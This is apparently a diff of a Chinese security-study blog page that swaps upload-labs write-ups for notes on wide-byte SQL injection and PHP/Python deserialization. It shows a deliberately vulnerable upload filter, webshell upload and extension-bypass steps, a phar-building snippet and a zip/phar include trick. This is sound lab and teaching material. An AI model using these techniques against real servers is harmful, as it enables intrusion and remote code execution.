@@ -71,9 +71,9 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-Web/文件上传/upload-labs/空格点绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Web/注入漏洞/SQL注入/宽字节注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E7%A9%BA%E6%A0%BC%E7%82%B9%E7%BB%95%E8%BF%87/" class="article-date">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" class="article-date">
   <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
 </a>
     
@@ -83,16 +83,15 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="空格点绕过"><a href="#空格点绕过" class="headerlink" title="空格点绕过"></a>空格点绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>可以用点空格点来绕过，<kbd>$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;</kbd>​因为加载的是文件名字，检测的是文件后缀</p>
-</blockquote>
+        <h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="宽字节注入-1"><a href="#宽字节注入-1" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>在了解宽字节注入之前，我们先来看一看字符集是什么。</p>
+<p><strong>字符集:</strong> 也叫字符编码，是一种将符号转换为二进制数的映射关系。几种常见的字符集:<br> <strong>·ASCII编码:</strong> 单字节编码。<br> <strong>·gbk编码:</strong> 使用一字节和双字节编码，0x00-0x7F范围内是一位，和ASCII保持一致。双字节的第一字节范围是0x81-0xFE。<br> <strong>·UTF-8编码:</strong> 使用一至四字节编码，0x00-0x7F范围内是一位，和ASCII保持一致。其它字符用二至四个字节变长表示。<br><strong>宽字节:</strong> 就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御。</p>
+<p>通常来说，一个gbk编码汉字，占用<strong>2个</strong>字节。一个utf-8编码的汉字，占用<strong>3个</strong>字节。在php中，我们可以通过输出echo strlen(“和”);来测试</p>
+<p>‍</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E7%A9%BA%E6%A0%BC%E7%82%B9%E7%BB%95%E8%BF%87/" data-id="cmaxy8gch003qkg7kduy4a3j2" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" data-id="cmaxygi1d003foc7k0pyu2kvc" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -104,9 +103,9 @@
 
 
   
-    <article id="post-Web/文件上传/upload-labs/文件类型绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Web/注入漏洞/反序列化/反序列化详解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/" class="article-date">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/" class="article-date">
   <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
 </a>
     
@@ -116,80 +115,164 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="文件类型绕过"><a href="#文件类型绕过" class="headerlink" title="文件类型绕过"></a>文件类型绕过</h1><blockquote>
-<p>1.还是打开抓包工具，上传一句话木马，发现是上传成功了，说明是后端验证的</p>
+        <h1 id="反序列化详解"><a href="#反序列化详解" class="headerlink" title="反序列化详解"></a>反序列化详解</h1><h3 id="什么是序列化"><a href="#什么是序列化" class="headerlink" title="什么是序列化"></a>什么是序列化</h3><blockquote>
+<p>将各种类型的数据压缩按照一定格式存储的过程 使用函数serialize()</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//源代码</span></span><br><span class="line"><span class="meta">&lt;?php</span>0－</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">    ...一些方法 不过序列化不在意这些</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//序列化结果</span></span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;DEMO1&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;evi l&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;arg&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;phpinfo()&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">这里的O表示这是一个对象</span><br><span class="line">    对象名占<span class="number">5</span>个字符</span><br><span class="line">    对象名是DEMO1</span><br><span class="line">    对象有<span class="number">2</span>个属性</span><br><span class="line">    注意属性的长度存在不可见字符<span class="number">0</span>  用来区分属性 是<span class="keyword">public</span> 还是<span class="keyword">private</span> 或者<span class="keyword">protected</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="什么是反序列化"><a href="#什么是反序列化" class="headerlink" title="什么是反序列化"></a>什么是反序列化</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">php反序列化</a>漏洞又称**&#x3D;&#x3D;对象注入&#x3D;&#x3D;** ， 可能会导致&#x3D;&#x3D;远程代码执行（RCE）&#x3D;&#x3D;</p>
+<p>理解为&#x3D;&#x3D;漏洞执行unserialize函数&#x3D;&#x3D; 调用某一类并&#x3D;&#x3D;执行魔术方法&#x3D;&#x3D; 之后&#x3D;&#x3D;执行类中的函数&#x3D;&#x3D; 产生安全问题</p>
 </blockquote>
 <blockquote>
-<p>2.通过content-type判断文件类型</p>
+<h3 id="漏洞前提"><a href="#漏洞前提" class="headerlink" title="漏洞前提"></a>漏洞前提</h3><ol>
+<li>unserialize()函数的&#x3D;&#x3D;变量可控&#x3D;&#x3D;</li>
+<li>php文件中存在&#x3D;&#x3D;可利用的类&#x3D;&#x3D;，类中有&#x3D;&#x3D;魔术方法&#x3D;&#x3D;</li>
+</ol>
 </blockquote>
-<p><img src="/.com//image-20250119174443-twfakc5.png" alt="image"></p>
-<h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><blockquote>
-<p>上传一句话木马php，然后把content-type的验证改为jpg的可以放行</p>
+<h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><blockquote>
+<h5 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h5><ol>
+<li>把题目代码<strong>复制</strong>到本地</li>
+<li>&#x3D;&#x3D;注释掉方法&#x3D;&#x3D;和&#x3D;&#x3D;一些没有用的东西&#x3D;&#x3D;</li>
+<li>本地对&#x3D;&#x3D;属性赋值&#x3D;&#x3D;，&#x3D;&#x3D;构造序列化&#x3D;&#x3D;，<strong>url编码后输出</strong>，避免把&#x3D;&#x3D;不可见字符&#x3D;&#x3D;的影响</li>
+</ol>
 </blockquote>
-<h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><blockquote>
-<p>上传更改过后的一句话木马，上传jpg后缀的，然后burp改为php放行</p>
-</blockquote>
+<h5 id="操作过程举例："><a href="#操作过程举例：" class="headerlink" title="操作过程举例："></a>操作过程举例：</h5><p>对源代码进行注释后赋值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="comment">//赋值</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// public function safe()&#123;</span></span><br><span class="line"><span class="comment">// echo $this-&gt;arg;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// public function evil() &#123;</span></span><br><span class="line"><span class="comment">// eval($this-&gt;arg);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// public function run()&#123;</span></span><br><span class="line"><span class="comment">// $this-&gt;&#123;$this-&gt;func&#125;();</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $obj = unserialize($_GET[&#x27;a&#x27;]);</span></span><br><span class="line"><span class="comment">// $obj-&gt;run();</span></span><br></pre></td></tr></table></figure>
+
+<p>然后再在最后输出结果</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">DEMO1</span>()));    <span class="comment">//单纯序列化</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">DEMO1</span>())));    <span class="comment">//进行url编码</span></span><br></pre></td></tr></table></figure></blockquote>
 <p>‍</p>
+<h3 id="三种赋值"><a href="#三种赋值" class="headerlink" title="三种赋值"></a>三种赋值</h3><p>内部直接赋值 只能赋值字符串</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">DEMO1</span>()));</span><br></pre></td></tr></table></figure></blockquote>
+<p>外部赋值 只能访问public属性的变量</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//新建一个然后直接输出这个$o</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">DEMO1</span>();</span><br><span class="line"><span class="variable">$o</span> -&gt; func = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line"><span class="variable">$o</span> -&gt; arg = <span class="string">&#x27;phpinfo();&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>)); </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>小技巧：</strong>  对于php7.1+版本，对属性容错机制较高，就算不是public也可以在本地修改成public</p>
+</blockquote>
+<h6 id="构造方法赋值-万能方法-解决上述所有麻烦"><a href="#构造方法赋值-万能方法-解决上述所有麻烦" class="headerlink" title="构造方法赋值 (万能方法)解决上述所有麻烦"></a>构造方法赋值 (万能方法)解决上述所有麻烦</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DEMO1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; func = <span class="string">&#x27;evil&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; arg = <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">DEMO1</span>()));</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h3 id="POP-chain"><a href="#POP-chain" class="headerlink" title="POP chain"></a>POP chain</h3><h4 id="魔术方法："><a href="#魔术方法：" class="headerlink" title="魔术方法："></a>魔术方法：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()		   <span class="comment">//对象创建(new)时会自动调用。</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>() 		       <span class="comment">//使用unserialize时触发</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() 		       <span class="comment">//使用serialize时触发</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() 	       <span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() 		       <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() 	       <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() 		       <span class="comment">//用于从不可访问的属性读取数据 包括private或者是不存在的</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() 		       <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() 		       <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>()  		       <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() 		   <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()             <span class="comment">//当脚本尝试将对象调用为函数时触发  就是加了括号</span></span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()           <span class="comment">//在代码中当调用不存在的类时会</span></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h4 id><a href="#" class="headerlink" title></a></h4><h2 id="思路总结："><a href="#思路总结：" class="headerlink" title="思路总结："></a>思路总结：</h2><h4 id="做题步骤"><a href="#做题步骤" class="headerlink" title="做题步骤"></a>做题步骤</h4><ol>
+<li>写出基本序列化</li>
+<li>写出注入的对象</li>
+<li>写出注入的对象 分析是长到短还是短到长的替换，决定要把对象注入到什么地方</li>
+<li>算清楚替换的差值，计算需要吃掉或挤出（逃逸）的字符串长度，保证这个长度是替换的差值的整数倍，如果不是 则加字符串</li>
+<li>构造替换，对象注入</li>
+</ol>
+<h4 id="长到短的替换"><a href="#长到短的替换" class="headerlink" title="长到短的替换"></a>长到短的替换</h4><p>在第一个元素进行替换，进而吃掉第二个元素的约束，第二个元素就逃逸出来了</p>
+<h4 id="短到长的替换"><a href="#短到长的替换" class="headerlink" title="短到长的替换"></a>短到长的替换</h4><p>暂缺</p>
+<p>‍</p>
+<h2 id="0718-Phar反序列化"><a href="#0718-Phar反序列化" class="headerlink" title="0718 Phar反序列化"></a>0718 Phar反序列化</h2><h3 id="Phar是什么？"><a href="#Phar是什么？" class="headerlink" title="Phar是什么？"></a>Phar是什么？</h3><p>可以将多个文件组合成一个文件，</p>
+<h3 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h3><p>phar:&#x2F;&#x2F;xxx.phar&#x2F;1.png</p>
+<p>zip:&#x2F;&#x2F;xxx.zip#1.png</p>
+<h3 id="攻击思路-在上传包含中的利用"><a href="#攻击思路-在上传包含中的利用" class="headerlink" title="攻击思路 在上传包含中的利用"></a>攻击思路 在上传包含中的利用</h3><p>可以上传图片，不能上传php</p>
+<p>可以包含 但是只能<code>include(&#39;$userinput.php&#39;);</code>​</p>
+<p>压缩一个shell.php到1.zip,重命名为1.png，上传</p>
+<p>包含：zip:&#x2F;&#x2F;upload.png#shell或phar:&#x2F;&#x2F;upload.png&#x2F;shell 因为在包含的时候在尾部上面的include会拼接上一个php</p>
+<h3 id="如何反序列化"><a href="#如何反序列化" class="headerlink" title="如何反序列化"></a>如何反序列化</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ol>
+<li>需要有可用的类，类下有魔术方法，最后POP chain调用到危险方法</li>
+<li>需要文件操作函数去触发 <code>phar://</code>​ stream</li>
+<li>有上传或者写文件的操作，可以把无损phar文件写入web服务器，后缀名任意</li>
+</ol>
+<h4 id="本地phar的条件"><a href="#本地phar的条件" class="headerlink" title="本地phar的条件"></a>本地phar的条件</h4><p>在php.ini中 <strong>phar.readonly</strong>  <strong>&#x3D;</strong>  <strong>Off</strong></p>
+<h4 id="构造phar反序列化"><a href="#构造phar反序列化" class="headerlink" title="构造phar反序列化"></a>构造phar反序列化</h4><ol>
+<li>把class定义的代码抄下来，把方法注释了</li>
+<li>构造pop链</li>
+<li><del>echo serialize($o)</del></li>
+<li>贴phar八股文</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
+
+<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>还是正常做反序列化的流程，找pop chain，然后本地构造好序列化</p>
+<p>之前:echo serialize($o);</p>
+<p>现在:生成phar文件把$o加载进去 就是在setMetadata中</p>
+<h4 id="可以利用的函数"><a href="#可以利用的函数" class="headerlink" title="可以利用的函数"></a>可以利用的函数</h4><p><img src="/.com//17476573059446373117876879156311-20250519202147-4srw68y.png" alt="17476573059446373117876879156311"></p>
+<h4 id="绕过反序列化中的关键字"><a href="#绕过反序列化中的关键字" class="headerlink" title="绕过反序列化中的关键字"></a>绕过反序列化中的关键字</h4><h5 id="hex-通用"><a href="#hex-通用" class="headerlink" title="hex 通用"></a>hex 通用</h5><p>&#x3D;&#x3D;s:1:“A” 和 S:1:”\61”是一样的意思&#x3D;&#x3D;</p>
+<p>当标识字符串的s为大写的时候，\hex标识对应字符</p>
+<p>所以绕过flag的过滤：S:4:“\66\6c\61\67”</p>
+<h5 id="绕过-0字符-php7-1"><a href="#绕过-0字符-php7-1" class="headerlink" title="绕过\0字符 php7.1+"></a>绕过\0字符 php7.1+</h5><p>虽然类中定义的属性可能不是public 但是我们可以假装是public，然后生成public类型的反序列化字符串。由于PHP7.1+的容错机制可以反序列化成功</p>
+<p>private-&gt;public</p>
+<p>‍</p>
+<h1 id="0720-Pickle反序列化"><a href="#0720-Pickle反序列化" class="headerlink" title="0720 Pickle反序列化"></a>0720 Pickle反序列化</h1><h3 id="what-is-Pickle？"><a href="#what-is-Pickle？" class="headerlink" title="what is Pickle？"></a>what is Pickle？</h3><ul>
+<li>是<strong>python</strong>的一个模块，内存中的东西因为断电等原因容易丢失，可以将对象以文件的形式存放在磁盘上 实现持久化存储</li>
+<li>只能在python中使用 import pickle</li>
+<li>序列化后的数据可读性非常差 人一般无法识别</li>
+<li>cPickle模块是C语言实现的</li>
+</ul>
+<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>​<code>pickle.dump(obj, file[,protocol])</code>​</p>
+<p>如果加s dumps 返回字符串 否则是到文件中</p>
+<p>序列化对象，将结果数据流写入到文件对象中</p>
+<p>参数protocol是序列化模式，默认为0，表示以文本的形式序列化，还可以是1或2，表示以二进制的形式序列化</p>
